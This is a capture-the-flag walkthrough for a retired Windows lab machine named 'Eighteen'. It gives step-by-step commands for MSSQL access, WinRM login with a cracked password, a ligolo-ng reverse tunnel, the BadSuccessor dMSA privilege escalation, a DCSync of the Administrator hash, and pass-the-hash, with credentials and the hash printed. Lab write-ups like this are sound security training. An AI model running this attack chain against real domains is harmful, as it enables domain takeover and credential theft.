# Eighteen

![OS](https://img.shields.io/badge/OS-Windows-0078D6?style=flat-square&logo=windows&logoColor=white) ![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=flat-square) ![Released](https://img.shields.io/badge/Released-2025--11--15-informational?style=flat-square)

| | |
|---|---|
| **OS** | Windows |
| **Difficulty** | Easy |
| **Release** | November 15, 2025 |
| **Rating** | 2.4 / 5 |
| **Points** | — (retired; no longer awards points) |

## Summary

Starting MSSQL credentials for `kevin` give guest-level database access, but a hash recovered from the database cracks to `adam.scott`'s password, which works over WinRM for the user flag. Root is **BadSuccessor** — the dMSA privilege-escalation technique: create a delegated managed service account targeting `Administrator`, request an S4U2self ticket for it as `adam.scott`, and the resulting dMSA ticket inherits Administrator privileges, which DCSyncs the Administrator NT hash.

---

Key vulnerability: BadSuccessor (dMSA privilege escalation).

---

## Phase 1: Initial Access

### Given credentials

```
kevin:iNa2we6haRj2gaw!
```

### Connect to MSSQL

```bash
mssqlclient.py kevin:'iNa2we6haRj2gaw!'@<TARGET_IP>
```

### Enumerate the database

```sql
SELECT name FROM master.dbo.sysdatabases;
enum_db
```

`kevin` is a guest user with limited privileges. The hash found in the database cracks to reveal `adam.scott`'s password.

### Discovered credentials

```
adam.scott:iloveyou1
```

---

## Phase 2: User Flag

```bash
evil-winrm -i <TARGET_IP> -u adam.scott -p 'iloveyou1'
```

```powershell
type C:\Users\adam.scott\Desktop\user.txt
```

---

## Phase 3: Ligolo Tunnel Setup

The DC is only reachable for some operations through a tunnel, so set up ligolo-ng.

### Download ligolo-ng

```bash
# On the attacker machine
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_windows_amd64.zip
tar -xzf ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz
unzip ligolo-ng_agent_0.6.2_windows_amd64.zip
```

### Start the proxy (Linux)

```bash
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 240.0.0.1/32 dev ligolo
./proxy -selfcert -laddr 0.0.0.0:11601
```

### Upload and run the agent (evil-winrm)

```powershell
upload agent.exe
.\agent.exe -connect <YOUR_IP>:11601 -ignore-cert
```

### In the ligolo proxy

```
session
start
```

### Add the DC to the hosts file (Linux)

```bash
echo "240.0.0.1 DC01.eighteen.htb eighteen.htb" | sudo tee -a /etc/hosts
```

---

## Phase 4: BadSuccessor Attack (Root)

### Prerequisites

Update impacket to a version with dMSA support:

```bash
pip install git+https://github.com/fortra/impacket.git --break-system-packages
```

### Upload BadSuccessor (evil-winrm)

```bash
# Download on the attacker
wget https://raw.githubusercontent.com/LuemmelSec/Pentest-Tools-Collection/main/tools/ActiveDirectory/BadSuccessor.ps1
```

```powershell
# Upload via evil-winrm
upload BadSuccessor.ps1
```

### Create the malicious dMSA (evil-winrm)

```powershell
Import-Module .\BadSuccessor.ps1
BadSuccessor -mode exploit -Path "OU=Staff,DC=eighteen,DC=htb" -Name "pwn_dmsa" `
  -DelegatedAdmin "adam.scott" -DelegateTarget "Administrator" -domain "eighteen.htb"
```

### Get a TGT for adam.scott (Linux)

```bash
# Sync time first (important!)
sudo ntpdate -u <TARGET_IP>

getTGT.py eighteen.htb/adam.scott:'iloveyou1' -dc-ip 240.0.0.1
export KRB5CCNAME=adam.scott.ccache
```

### Impersonate the dMSA with the `-dmsa` flag (Linux)

```bash
getST.py -impersonate 'pwn_dmsa$' -self -dmsa eighteen.htb/adam.scott \
  -k -no-pass -dc-ip 240.0.0.1
```

### DCSync Administrator (Linux)

```bash
export KRB5CCNAME='pwn_dmsa$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache'
secretsdump.py -k -no-pass DC01.eighteen.htb -dc-ip 240.0.0.1 \
  -target-ip 240.0.0.1 -just-dc-user Administrator
```

Administrator NTLM hash: `0b133be956bfaddf9cea56701affddec`.

### Pass-the-hash and read the root flag

```bash
evil-winrm -i <TARGET_IP> -u Administrator -H 0b133be956bfaddf9cea56701affddec
```

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

---

## Key Lessons Learned

1. **The Rubeus dMSA PR is buggy** — don't waste time with Rubeus for dMSA attacks. Use impacket remotely instead.

2. **Clock skew matters** — always sync time with the DC before Kerberos operations:

   ```bash
   sudo ntpdate -u <TARGET_IP>
   ```

3. **Latest impacket required** — the `-dmsa` flag only exists in the development version.

4. **BadSuccessor attack flow:**
   - Create a dMSA targeting Administrator
   - Use `adam.scott`'s TGT to request an S4U2self ticket for the dMSA
   - The dMSA ticket inherits Administrator privileges
   - DCSync with the dMSA ticket

5. **Ligolo routing** — `240.0.0.1` is the conventional address for reaching the internal DC through the tunnel.

---

## Tools Used

`mssqlclient.py`, evil-winrm, ligolo-ng, `BadSuccessor.ps1`, and impacket's `getTGT.py`, `getST.py` (with `-dmsa`) and `secretsdump.py`.

## References

- [BadSuccessor — dMSA attack](https://github.com/ibaiC/BadSuccessor)
- [Impacket](https://github.com/fortra/impacket)
- [Ligolo-ng](https://github.com/nicocha30/ligolo-ng)

---

*Retired machine. Flag values are deliberately omitted — see the [repository README](../../README.md#ethics-and-policy).*
